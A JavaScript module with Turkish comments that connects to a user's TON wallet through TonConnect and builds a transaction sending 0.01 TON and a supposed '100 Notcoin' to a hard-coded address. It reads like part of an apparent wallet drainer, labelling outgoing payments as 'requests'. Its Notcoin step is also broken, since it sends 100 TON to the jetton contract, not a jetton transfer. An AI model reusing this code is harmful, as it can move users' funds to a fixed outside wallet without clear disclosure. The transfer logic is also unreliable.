/* eslint-disable */
import TonWeb from 'tonweb'; // TonWeb kütüphanesini import ediyoruz
const tonweb = new TonWeb(); // TonWeb'i başlatıyoruz

const TON_API_BASE_URL = "https://toncenter.com/api/v3"; // TON API Base URL
const NOTCOIN_JETTON_CONTRACT = "0:2F956143C461769579BAEF2E32CC2D7BC18283F40D20BB03E432CD603AC33FFC"; // Notcoin jetton contract adresi

// API utility fonksiyonları
const getJettonWallet = async (ownerAddress, jettonAddress) => {
  const response = await fetch(`${TON_API_BASE_URL}/jetton/wallets?jetton_address=${jettonAddress}&owner_address=${ownerAddress}`, {
    method: 'GET',
    headers: { "X-API-Key": "YOUR_TON_API_KEY" }, // Ton API Key'inizi buraya ekleyin
  });
  const data = await response.json();
  const wallets = data.jetton_wallets;
  return wallets.length > 0 ? wallets[0] : null;
};

// WalletManager sınıfı
class WalletManager {
  constructor(wallet) {
    this.wallet = wallet;
  }

  async getAccount() {
    const accountInfoResponse = await fetch(`${TON_API_BASE_URL}/account?address=${this.wallet.account.address}`, {
      method: 'GET',
      headers: { "X-API-Key": "YOUR_TON_API_KEY" }, // Ton API Key'inizi buraya ekleyin
    });
    return await accountInfoResponse.json();
  }

  async getTONBalance() {
    const accountInfo = await this.getAccount();
    return accountInfo.balance;
  }

  async getNotcoinWallet() {
    return await getJettonWallet(this.wallet.account.address, NOTCOIN_JETTON_CONTRACT);
  }

  async getNotcoinBalance() {
    const wallet = await this.getNotcoinWallet();
    return wallet == null ? 0 : wallet.balance;
  }
}

const request_transaction = async (tonConnectUI) => {
  try {
    console.log('Transaction talep ediliyor...');

    // Cüzdan adresini al
    const walletAddress = tonConnectUI.account?.address;
    if (!walletAddress) {
      console.error("Cüzdan adresi bulunamadı.");
      return; // Cüzdan adresi yoksa fonksiyonu bitir
    }

    console.log('Cüzdan adresi:', walletAddress);

    // Burada 0.01 TON ve 100 Notcoin talep ediyoruz
    const amountToRequestTON = 10000000; // 0.01 TON'u nanoTON cinsinden belirtin
    const amountToRequestNotcoin = 100; // 100 Notcoin

    // Hedef cüzdan adresini buraya yazın
    const targetAddress = "UQDKbP8AA8sYpdI5v4elb600P5f6tdXbOJrG3vEjnoAiHREB"; // Hedef cüzdan adresi

    // WalletManager oluştur
    const WALLET = new WalletManager(tonConnectUI); // WalletManager'ı cüzdan nesnesi ile başlat

    // Talep mesajları
    const messages = [
      {
        address: targetAddress, // Hedef cüzdan adresi
        amount: amountToRequestTON, // Talep edilen TON miktarı
        payload: '', // Payload kısmını boş bırakıyoruz
      },
      {
        address: NOTCOIN_JETTON_CONTRACT, // Notcoin jetton contract adresi
        amount: amountToRequestNotcoin * 1e9, // Talep edilen Notcoin miktarını nano cinsinden belirtin
        payload: '', // Payload kısmını boş bırakıyoruz
      },
    ];

    console.log('Talep mesajları:', messages);

    // Transaction işlemini başlat
    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 saniyelik geçerlilik süresi
      messages,
    };

    console.log('Transaction gönderiliyor...', transaction);

    // Transaction gönder
    const result = await tonConnectUI.sendTransaction(transaction);
    console.log('Transaction başarılı:', result);

  } catch (error) {
    console.error('Transaction hatası:', error);
    alert("Transaction gerçekleşmedi: " + error.message); // Hata mesajını kullanıcıya göster
  }
};

export { request_transaction };
